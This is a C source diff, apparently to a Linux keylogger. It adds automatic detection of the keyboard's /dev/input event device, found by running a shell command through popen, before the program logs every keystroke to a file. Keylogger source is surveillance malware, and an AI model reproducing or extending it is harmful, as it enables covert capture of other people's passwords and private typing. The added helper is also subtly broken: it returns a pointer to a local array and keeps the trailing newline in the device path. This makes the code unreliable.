@@ -2,6 +2,7 @@
 #include <fcntl.h>
 #include <unistd.h>
 #include <stdlib.h>
+#include <string.h>
 #include <linux/input.h>
 #include "functions.h"
 #include "define.h"
@@ -11,6 +12,24 @@
 input_event event;
 int shift = 0;
 int caps = 0;				// assuming capslock to be off
+
+
+// to find device file
+static char *getKeyboardDevicePath(){
+
+	// get filename
+	char *filename;
+	char path[16];
+	FILE *fp = popen(COMMAND, "r");
+	filename = fgets(path, sizeof path-1, fp);
+	pclose(fp);
+
+	// concat /dev/input/ to filename
+	char *filepath;
+	char dest[32] = "/dev/input/";
+	filepath = strncat(dest, filename, strlen(filename));
+	return filepath;
+}
 
 
 // checking for shift key
@@ -64,6 +83,18 @@ int main(){
 		exit(0);
 	}
 
+	// get keyboard device file
+	char *devicefile = getKeyboardDevicePath();
+
+	// device file
+	int fp = open(devicefile, O_RDONLY);
+
+	// device file check
+	if(fp == -1){
+		printf("Device file not found\n");
+		exit(0);
+	}
+
 	// log file
 	FILE *lf = fopen(LOGFILE, "ab");
 
@@ -76,15 +107,6 @@ int main(){
 	/* To disable buffering and allow writing to log file 
 		as soon as a key is pressed. */
 	setbuf(lf, NULL);
-
-	// device file
-	int fp = open(DEVICEFILE, O_RDONLY);
-
-	// device check
-	if(fp == -1){
-		printf("Device file not found\n");
-		exit(0);
-	}
 
 	// capturing keystrokes
 	while(1){
